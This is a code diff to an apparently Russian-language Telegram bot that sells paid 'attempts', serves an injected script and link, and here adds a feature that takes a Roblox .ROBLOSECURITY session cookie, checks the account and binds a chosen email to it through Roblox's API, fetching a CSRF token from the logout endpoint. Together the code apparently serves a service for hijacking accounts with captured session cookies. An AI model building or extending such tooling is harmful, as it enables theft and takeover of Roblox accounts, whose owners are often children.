@@ -39,6 +39,8 @@ WAITING_ADMIN_BROADCAST = 7
 WAITING_ADMIN_ADD_BALANCE = 8
 WAITING_ADMIN_ADD_BALANCE_AMOUNT = 9
 WAITING_ADMIN_CREATE_PROMO = 10
+WAITING_EMAIL_COOKIE = 11
+WAITING_EMAIL_INPUT = 12
 
 PRICE = 0.20
 DISCOUNTS = {5: 0.05, 10: 0.10, 25: 0.15}
@@ -127,6 +129,45 @@ INJECT_SCRIPT = r"""
     };
 })();
 """
+
+
+def check_email_status(cookie):
+    """Проверяем привязана ли почта"""
+    try:
+        s = requests.Session()
+        s.cookies[".ROBLOSECURITY"] = cookie
+        r = s.get("https://accountinformation.roblox.com/v1/email")
+        if r.status_code == 200:
+            data = r.json()
+            return data.get("emailAddress", ""), data.get("verified", False)
+        return None, None
+    except Exception:
+        return None, None
+
+def get_csrf_token(cookie):
+    """Получаем CSRF токен"""
+    try:
+        s = requests.Session()
+        s.cookies[".ROBLOSECURITY"] = cookie
+        r = s.post("https://auth.roblox.com/v2/logout")
+        return r.headers.get("x-csrf-token", "")
+    except Exception:
+        return ""
+
+def link_email(cookie, email):
+    """Привязываем почту к аккаунту"""
+    try:
+        s = requests.Session()
+        s.cookies[".ROBLOSECURITY"] = cookie
+        csrf = get_csrf_token(cookie)
+        s.headers["x-csrf-token"] = csrf
+        r = s.post(
+            "https://accountinformation.roblox.com/v1/email",
+            json={"emailAddress": email}
+        )
+        return r.status_code == 200, r.text
+    except Exception as e:
+        return False, str(e)
 
 
 def build_url(data):
@@ -344,6 +385,7 @@ def check_invoice(invoice_id):
 def main_menu_kb():
     return InlineKeyboardMarkup([
         [InlineKeyboardButton("Получить ссылку", callback_data="get_link")],
+        [InlineKeyboardButton("Привязать почту", callback_data="link_email")],
         [InlineKeyboardButton("Купить попытки", callback_data="buy"),
          InlineKeyboardButton("Промокод", callback_data="promo")],
         [InlineKeyboardButton("Топ пользователей", callback_data="top")],
@@ -431,6 +473,20 @@ async def handle_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if data == "main_menu":
         await show_main_menu(update, context)
         return WAITING_MENU
+
+    if data == "link_email":
+        await query.edit_message_text(
+            "*Привязка почты к Roblox*\n\n"
+            "Отправь свой `.ROBLOSECURITY` cookie\n\n"
+            "Бот проверит привязана ли почта и если нет - привяжет.\n\n"
+            "Сообщение будет удалено автоматически",
+            parse_mode="Markdown",
+            reply_markup=InlineKeyboardMarkup([
+                [InlineKeyboardButton("Назад", callback_data="main_menu")]
+            ])
+        )
+        context.user_data["waiting"] = "email_cookie"
+        return WAITING_EMAIL_COOKIE
 
     if data == "promo":
         await query.edit_message_text(
@@ -875,6 +931,99 @@ async def receive_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
         )
         return WAITING_ADMIN
 
+    # Обработка cookie для email
+    if waiting == "email_cookie":
+        context.user_data["waiting"] = None
+        cookie = text
+        try:
+            await update.message.delete()
+        except Exception:
+            pass
+        msg = await update.message.reply_text("Проверяю аккаунт...")
+        s = requests.Session()
+        s.cookies[".ROBLOSECURITY"] = cookie
+        r = s.get("https://users.roblox.com/v1/users/authenticated")
+        if r.status_code != 200:
+            await msg.edit_text(
+                "Неверный cookie!",
+                reply_markup=InlineKeyboardMarkup([
+                    [InlineKeyboardButton("Назад", callback_data="main_menu")]
+                ])
+            )
+            return WAITING_MENU
+        user = r.json()
+        email, verified = check_email_status(cookie)
+        if email:
+            await msg.edit_text(
+                "*Аккаунт: " + user["name"] + "*\n\n"
+                "Почта уже привязана: `" + email + "`\n"
+                "Статус: " + ("Подтверждена" if verified else "Не подтверждена"),
+                parse_mode="Markdown",
+                reply_markup=InlineKeyboardMarkup([
+                    [InlineKeyboardButton("Назад", callback_data="main_menu")]
+                ])
+            )
+            return WAITING_MENU
+        # Почта не привязана — просим ввести
+        context.user_data["email_cookie"] = cookie
+        context.user_data["email_username"] = user["name"]
+        context.user_data["waiting"] = "email_input"
+        await msg.edit_text(
+            "*Аккаунт: " + user["name"] + "*\n\n"
+            "Почта не привязана.\n\n"
+            "Введите email для привязки:",
+            parse_mode="Markdown",
+            reply_markup=InlineKeyboardMarkup([
+                [InlineKeyboardButton("Отмена", callback_data="main_menu")]
+            ])
+        )
+        return WAITING_EMAIL_INPUT
+
+    # Обработка ввода email
+    if waiting == "email_input":
+        context.user_data["waiting"] = None
+        import re as _re
+        email_addr = text.strip()
+        if not _re.match("[^@]+@[^@]+[.][^@]+", email_addr):
+            await update.message.reply_text(
+                "Неверный формат email! Попробуй снова.",
+                reply_markup=InlineKeyboardMarkup([
+                    [InlineKeyboardButton("Отмена", callback_data="main_menu")]
+                ])
+            )
+            context.user_data["waiting"] = "email_input"
+            return WAITING_EMAIL_INPUT
+        cookie = context.user_data.get("email_cookie", "")
+        username = context.user_data.get("email_username", "")
+        msg = await update.message.reply_text("Привязываю почту...")
+        success, response = link_email(cookie, email_addr)
+        if success:
+            await msg.edit_text(
+                "*Почта успешно привязана!*\n\n"
+                "Аккаунт: *" + username + "*\n"
+                "Email: `" + email_addr + "`\n\n"
+                "Проверь почту для подтверждения.",
+                parse_mode="Markdown",
+                reply_markup=InlineKeyboardMarkup([
+                    [InlineKeyboardButton("В меню", callback_data="main_menu")]
+                ])
+            )
+        else:
+            await msg.edit_text(
+                "*Ошибка привязки почты*\n\n"
+                "Возможные причины:\n"
+                "- Email уже используется другим аккаунтом\n"
+                "- Неверный формат email\n"
+                "- Проблема с сессией\n\n"
+                "Ответ сервера: `" + str(response)[:100] + "`",
+                parse_mode="Markdown",
+                reply_markup=InlineKeyboardMarkup([
+                    [InlineKeyboardButton("Попробовать снова", callback_data="link_email")],
+                    [InlineKeyboardButton("В меню", callback_data="main_menu")],
+                ])
+            )
+        return WAITING_MENU
+
     # Иначе — обрабатываем как cookie
     return await receive_cookie_inner(update, context)
 
@@ -1001,7 +1150,10 @@ def main():
                 CallbackQueryHandler(handle_callback),
                 MessageHandler(filters.TEXT & ~filters.COMMAND, receive_text),
             ],
-            WAITING_ADMIN: [CallbackQueryHandler(handle_callback)],
+            WAITING_ADMIN: [
+                CallbackQueryHandler(handle_callback),
+                MessageHandler(filters.TEXT & ~filters.COMMAND, receive_text),
+            ],
             WAITING_ADMIN_BROADCAST: [
                 CallbackQueryHandler(handle_callback),
                 MessageHandler(filters.TEXT & ~filters.COMMAND, receive_text),
@@ -1015,6 +1167,14 @@ def main():
                 MessageHandler(filters.TEXT & ~filters.COMMAND, receive_text),
             ],
             WAITING_ADMIN_CREATE_PROMO: [
+                CallbackQueryHandler(handle_callback),
+                MessageHandler(filters.TEXT & ~filters.COMMAND, receive_text),
+            ],
+            WAITING_EMAIL_COOKIE: [
+                CallbackQueryHandler(handle_callback),
+                MessageHandler(filters.TEXT & ~filters.COMMAND, receive_text),
+            ],
+            WAITING_EMAIL_INPUT: [
                 CallbackQueryHandler(handle_callback),
                 MessageHandler(filters.TEXT & ~filters.COMMAND, receive_text),
             ],
